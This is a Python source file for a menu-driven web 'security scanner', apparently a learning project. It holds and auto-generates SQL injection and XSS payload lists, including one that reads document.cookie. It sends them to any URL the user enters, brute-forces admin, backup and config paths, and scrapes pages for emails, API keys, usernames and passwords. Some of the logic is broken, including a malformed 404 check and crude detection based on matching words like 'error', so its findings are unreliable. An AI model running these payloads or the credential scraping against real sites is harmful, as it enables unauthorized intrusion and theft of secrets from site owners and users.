import re
import requests
import itertools
from bs4 import BeautifulSoup
from urllib.parse import urlparse

class WebSecurityScanner:
    def __init__(self):
        self.VULNERABLE_DIRECTORIES = [
    'admin', 'login', 'wp-admin', 'administrator', 'adminpanel', 'admin-login',
    'useradmin', 'cpanel', 'dashboard', 'manage', 'controlpanel', 'adminarea',
    'adminconsole', 'backend', 'admincp', 'moderator', 'admin1', 'admin2',
    'sysadmin', 'root', 'adminpanel.php', 'backup', 'config', 'phpmyadmin',
    'test', 'temp', 'uploads', 'images', 'css', 'js', 'db', 'database',
    'private', 'secret', 'old', 'archive', 'logs', 'includes', 'cgi-bin',
    'shell', 'scripts', 'vendor', 'api', 'auth', 'secure', 'data',
    'configurations', 'setup', 'install', 'webadmin', 'portal', 'system'
    ]
        
        self.SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' OR '1'='1' -- ",
    "' OR 1=1#",
    "' OR 1=1/*",
    ]
        
        self.XSS_PAYLOADS = [
        # Basic Script Injection
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        # HTML Attribute Breakout
        "\"><script>alert(1)</script>",
        "' onmouseover='alert(1)' x='",
        # Obfuscation & Filter Evasion
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<svg><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        # JavaScript Context
        "';alert(1);//",
        "`${alert(1)}`",
        # Event Handlers
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        # JS URI & Iframe
        "<iframe src='javascript:alert(1)'></iframe>",
        "<a href='javascript:alert(1)'>click</a>",
        # URL-Encoded & Hex
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        # DOM-Based
        "#<img src=x onerror=alert(1)>",
        ]
        
        self._generate_sqli_payloads()
        self._generate_xss_payloads()
        
    #This function uses itertools to generate all possible combinations of SQLi payloads.            
    def _generate_sqli_payloads(self):
        prefixes = ["'","\"",""]
        operators = ["OR","AND",""]
        conditions = ["1=1", "'1'='1'", "1=2", "'a'='a'"]
        comments = ["--", "#", "/*", ""]
        
        for combo in itertools.product(prefixes,operators,conditions,comments):
            payload = f"{combo[0]} {combo[1]} {combo[2]}{combo[3]}".strip()
            if payload and payload not in self.SQLI_PAYLOADS:
                self.SQLI_PAYLOADS.append(payload)
                
        for num in range(1,5):
            self.SQLI_PAYLOADS.extend([
                f"1' ORDER BY {num}--",
                f"1' GROUP BY {num}--",
                f"' UNION SELECT {','.join(['NULL']*num)}--"
            ])                
    
    #This function uses itertools to generate all possible combinations of XSS payloads.
    def _generate_xss_payloads(self):
        tags = ["script", "img", "svg", "iframe", "body", "input", "div"]
        events = ["onerror", "onload", "onmouseover", "onfocus", "onclick"]
        js_code = ["alert(1)", "prompt(1)", "console.log(1)", "document.cookie"]
        encodings = ["", "javascript:", "data:text/html;base64,"]
        
        for tag, js in itertools.product(tags,js_code):
            if tag == "script":
                self.XSS_PAYLOADS.append(f"<{tag}>{js}</{tag}>")
            else:
                for event in events:
                    self.XSS_PAYLOADS.append(f"<{tag} {event}={js}>")
                    
        for enc, js in itertools.product(encodings,js_code):
            if enc:
                self.XSS_PAYLOADS.append(f"{enc}{js}")                    
                                    

    def main_menu(self):
        print("\nWeb Security Scanner")
        print("1. Check for SQLi/XSS Vulnerabilities")
        print("2. Scrape Data from a webpage (emails, API keys, IP addresses, usernames, passwords)")
        print("3. Sensitive Directories Brute Force")
        print("4. Exit")
        
        while True:
            try:
                choice = int(input("Please select an option (1-4): "))
                if choice in [1,2,3,4]:
                    return choice
                else:
                    print("Please enter a valid option (1-4).")
            except ValueError:
                print("Invalid input. Please enter a number.")
            
#This function will check for SQL Injection in the given URL.            
    def check_sqli_vulnerabilities(self,url):
        print(f"\nChecking SQLi Vulnerabilities for {url}")
        print(f"Testing with {len(self.SQLI_PAYLOADS)} payload variations...")
        
        vulnerability_found = False #default value to false so that it can be changed to true if any vulnerability is found.
        for payload in self.SQLI_PAYLOADS:
            test_url = f"{url}?id={payload}" #For this porgram the payload is added to the URL as a query parameter. "?id=" is used to test the SQLi vulnerability.
            try:
                response = requests.get(test_url, timeout=5)
                if "error" in response.text.lower() or "sql" in response.text.lower(): #If we get an error or sql in the response text, then it is a potential SQLi vulnerability.
                    print(f"Potential SQL Injection vulnerability found with payload: {payload}")
                    vulnerability_found = True
            except:
                continue
            
        if not vulnerability_found:
            print("Website's security is good against SQL Injection. No Vulnerabilities found.")     
        
#Thisfunction will check for XSS vulnerabilities in the given URL.
    def check_xss_vulnerabilities(self,url):
        print(f"\nChecking XSS Vulnerabilities for {url}")
        print(f"Testing with {len(self.XSS_PAYLOADS)} payload variations...")
        
        vulnerability_found = False #same as above, default value to false so that it can be changed to true if any vulnerability is found.
        for payload in self.XSS_PAYLOADS:
            test_url = f"{url}?input={payload}" #For this porgram the payload is added to the URL as a query parameter. "?input=" is used to test the XSS vulnerability.
            try:
                response = requests.get(test_url, timeout=5)
                if payload in response.text: #if we get the payload in the response text, then it is a potential XSS vulnerability.
                    print(f"Potential XSS vulnerability found with payload: {payload}")
                    vulnerability_found = True
            except:
                continue
            
        if not vulnerability_found:
            print("Website's security is good against XSS. No Vulnerabilities found.")   
        
       
    def web_vulnerabilities(self,url):
        #Greate website for testing: http://testphp.vulnweb.com/artists.php?artist=1
        
        self.check_sqli_vulnerabilities(url)  #http://testphp.vulnweb.com/artists.php?artist=1
        self.check_xss_vulnerabilities(url)   #http://testphp.vulnweb.com/  
    
#This function will try to get any emails, API keys, IP addresses, usernames and passwords from the source code of the given URL.   
    def scrape_data(self,url):
        #Created a test website scrape_testing on my Desktop for testing.
        print(f"\nScraping data from {url}...")
        
        try:
            response = requests.get(url,timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            
            #Search for email addresses in the text
            email_pattern = r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b'     
            emails_found = re.findall(email_pattern, text)
            
            #Search for API keys in the text
            #Case sensitive, 32-64 characters, alphanumeric, underscores and hyphens
            api_key_pattern = r'(?:api[_-]?key|secret|token)[\'"\s:=]*([a-zA-Z0-9_\-]{32,64})'
            api_keys_found = re.findall(api_key_pattern, text, re.IGNORECASE)
            
            #Search for IP addresses in the text
            ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
            ips_found = re.findall(ip_pattern, text)
            
            #Search for usernames in the text
            username_pattern = r'\b(?:user|username|login|name|admin)[\'"\s:=]*([a-zA-Z0-9._-]+)'
            usernames_found = re.findall(username_pattern, text, re.IGNORECASE)
            
            #Search for passwords in the text
            password_pattern = r'\b(?:pass|password|pwd)[\'"\s:=]*([a-zA-Z0-9@#$%^&+=._-]+)'
            passwords_found = re.findall(password_pattern, text, re.IGNORECASE)
            
            def print_results(title, items):
                print(f"\n{title}:")
                if items:
                    for item in set(items):
                        print(f"- {item}")
                else:
                    print(f"No {title.lower()} found.")
            
            print_results("Email Addresses", emails_found)
            print_results("API Keys", api_keys_found)
            print_results("IP Addresses", ips_found)
            print_results("Usernames", usernames_found)
            print_results("Passwords", passwords_found)
            
        except Exception as e:
            print(f"An error occurred while scraping: {e}")                        

#This function will brute force the directories of the given URL.
    def vulnerable_directory_brute_force(self,url):
        #Greate website for testing: https://juice-shop.herokuapp.com/#/
        print(f"\nDirectory Brute Force for {url}...")
        
        parsed = urlparse(url) #parse the URL
        base_url = f"{parsed.scheme}://{parsed.netloc}" #get the base URL, so that we can append the directories to it. Otherwise it will not work.     
        
        found_directories = []
        
        if not base_url.endswith('/'):
            base_url += '/'
        
        for directory in self.VULNERABLE_DIRECTORIES:
            test_url = f"{base_url}{directory}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200: #If the status code is 200, then it is a potential directory.     
                    if (len(response.text) > 100 and not "404" in response in response.text.lower()      
                        and not "not found" in response.text.lower()): #If the response text is more than 100 characters and does not contain "404" or "not found", then it is a potential directory.
                            print("Found valid directory:", test_url)
                            found_directories.append(test_url)
            except:
                continue  
        
        print("\nBrute Force Results:")    
        if found_directories:
            print(f"Found {len(found_directories)} accesible directories:")
            for directory in found_directories:
                print(directory)
        else:
            print("No directories found.")  

#URL validation using regex.        
    def is_valid_url(self,url):
        url_pattern = re.compile(
            r'^(?:http|ftp)s?://'  # http:// or https://
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
            r'localhost|'  # localhost...
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
            r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
            r'(?::\d+)?'  # optional port
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)        
            
        return re.match(url_pattern, url) is not None
        
    def run(self):
        
        while True:
            choice = self.main_menu()
            
            if choice == 1:
                url = input("Enter the URL to check for vulnerabilities: ").strip()
                if not self.is_valid_url(url):
                    print("Invalid URL. Please enter a valid URL.")
                    continue
                try:
                    self.web_vulnerabilities(url)
                except KeyboardInterrupt:
                    print("\nScan interrupted by user.")
                    
            elif choice == 2:
                url = input("Enter the URL to scrape data from: ").strip()
                if not self.is_valid_url(url):
                    print("Invalid URL. Please enter a valid URL.")
                    continue
                try:
                    self.scrape_data(url)
                except KeyboardInterrupt:
                    print("\nScraping interrupted by user.")
                    
            elif choice == 3:
                url = input("Enter the URL to brute force directories: ").strip()
                if not self.is_valid_url(url):
                    print("Invalid URL. Please enter a valid URL.")
                    continue
                try:
                    self.vulnerable_directory_brute_force(url)
                except KeyboardInterrupt:
                    print("\nBrute force interrupted by user.")
                
            elif choice == 4:
                print("Exiting...")
                break
    
 
def main():
    scanner = WebSecurityScanner()
    scanner.run() 
    
if __name__ == "__main__":
    main()   
                                                         